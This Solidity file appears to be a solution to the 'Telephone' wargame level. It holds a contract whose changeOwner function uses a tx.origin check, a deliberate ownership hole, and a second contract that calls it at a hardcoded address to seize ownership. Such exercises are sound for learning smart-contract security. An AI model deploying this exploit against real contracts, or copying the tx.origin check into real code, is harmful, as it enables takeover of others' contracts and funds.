// SPDX-License-Identifier: MIT 

pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}


contract Call {
    Telephone teleContract = Telephone(0xaBE111694EC3DA6425bcAab92AC6861601226061);
    
    function callIt() public {
        teleContract.changeOwner(msg.sender);
    }
}